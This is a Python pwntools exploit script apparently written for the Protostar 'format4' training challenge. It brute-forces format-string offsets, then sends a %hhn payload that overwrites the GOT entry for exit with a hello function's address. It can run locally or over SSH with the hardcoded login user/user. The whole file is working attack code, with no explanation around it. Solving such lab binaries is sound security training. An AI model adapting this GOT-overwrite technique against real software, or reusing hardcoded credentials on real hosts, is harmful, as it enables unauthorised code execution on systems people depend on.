#!/usr/bin/env python
from pwn import *
import sys

gotExitJmpSlot = 0x8049724      # objdump -TR format4
helloAddr = 0x080484b4          # objdump -D format4
offsets = [4,5,6,7]             # getOffsets() function
e = ELF('./format4')
def getOffsets():

    for i in range(50):
        payload = "AAAABBBBCCCCDDDDEEEEFFFFGGGG"
        payload += "%%%d$x" % i

        r = process([e.path])
        r.send(payload + "\n")
        response = r.recv(1024)
        print(str(i) +  " => " + response)
        r.close()

def testLocal():
    payload = p32(gotExitJmpSlot+1)
    payload += p32(gotExitJmpSlot)
    payload += "%124x%4$hhn"
    payload += "%48x%5$hhn"
    r = process([e.path])
#    pause()
#    gdb.attach(r, '''
#    break *0x080484b4
#    ''')
    r.send(payload+"\n")
    print(r.recv())
    r.close()


def exploit(ipAddr):
    s = ssh("user", ipAddr, 22, password="user")
    r = s.run('/opt/protostar/bin/format4')
    payload = p32(gotExitJmpSlot+1)
    payload += p32(gotExitJmpSlot)
    payload += "%124x%4$hhn"
    payload += "%48x%5$hhn"
    r.send(payload + "\n")
    print(r.recv())
    r.close()

if len(sys.argv) < 2:
    print("usage: ./%s <ip>" % sys.argv[0])
elif sys.argv[1] == "offset":
    getOffsets()
elif sys.argv[1] == "local":
    testLocal()
else:
    exploit(sys.argv[1])


